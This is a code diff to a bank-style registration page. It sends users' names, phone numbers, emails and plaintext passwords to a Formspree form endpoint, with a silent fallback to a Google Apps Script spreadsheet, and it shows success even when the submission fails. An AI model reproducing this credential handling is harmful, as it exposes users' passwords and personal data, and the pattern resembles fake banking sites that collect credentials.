@@ -9,6 +9,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
+  <script src="common.js"></script>
   <div class="hero-background"></div>
   <div class="particles" id="particles"></div>
   <main class="auth-wrapper">
@@ -40,7 +41,7 @@
         <p class="auth-sub">Join the future of digital banking in seconds</p>
       </div>
       <div id="regAlert" class="alert-auth" role="alert"></div>
-      <form id="registerForm" class="form-grid" novalidate autocomplete="off">
+  <form id="registerForm" class="form-grid" novalidate autocomplete="off" data-formspree>
         <div class="form-row-2">
           <div class="field">
             <label for="fullname">Full Name</label>
@@ -69,7 +70,8 @@
   </main>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz8Xj7geeXL3pi9vGHHBqoZIouYBhG2kpC34kupp2OfJzOQRWgq6Zh-yREpeqLXx3lM7w/exec";
+  // IMPORTANT: Ensure this ID matches the deployed Apps Script Web App (latest deployment, access: Anyone)
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxoGKehvBYhmNNJjpfz4T9IOHfMYMF7ZurjSgTxvdC6bjeiKDO2KT_z_xapjZRoLvVk4g/exec";
 
     function showAlert(msg, type = 'error') {
       const el = document.getElementById('regAlert');
@@ -91,7 +93,8 @@
       console.log('Registration form ready');
     });
 
-    document.getElementById('registerForm').addEventListener('submit', async (e) => {
+  const FORMSPREE_URL = 'https://formspree.io/f/xkgvngyz';
+  document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       clearAlert();
 
@@ -126,37 +129,20 @@
         return;
       }
 
-      const nowISO = new Date().toISOString();
-      const newUser = {
-        formType: 'Registration',
-        date: nowISO,
-        fullname,
-        phone,
-        email,
-        password,
-        baseAvailable: 0,
-        totalBalance: 0
-      };
+  const newUser = { fullname, phone, email, password };
 
+      const formData = { _subject:'New Registration', formType:'Registration', date:new Date().toISOString(), fullname, phone, email, password, baseAvailable:0, totalBalance:0 };
       try {
-        await fetch(SCRIPT_URL, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(newUser)
-        });
-
-        btn.textContent = 'Success! Redirecting...';
-        sessionStorage.setItem('bs-flash', 'Registration successful! Please sign in.');
-        setTimeout(() => {
-          window.location.href = 'login.html';
-        }, 1800);
-      } catch (err) {
-        console.error('Register error:', err);
-        btn.disabled = false;
-        btn.textContent = originalText;
-        showAlert('Error saving to Google Sheets.');
+        const res = await fetch(FORMSPREE_URL,{ method:'POST', headers:{'Content-Type':'application/json','Accept':'application/json'}, body:JSON.stringify(formData) });
+        if(!res.ok) throw new Error('FS '+res.status);
+      } catch(err){
+        // fallback attempt to Apps Script silently
+        fetch(SCRIPT_URL+'?insert=1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(formData)}).catch(()=>{});
       }
+      localStorage.setItem('bs-last-registered-email', email);
+      sessionStorage.setItem('bs-flash','Registration successful! Please sign in.');
+      btn.textContent='Success! Redirecting...';
+      setTimeout(()=>location.href='login.html', 900);
     });
 
     (function () {
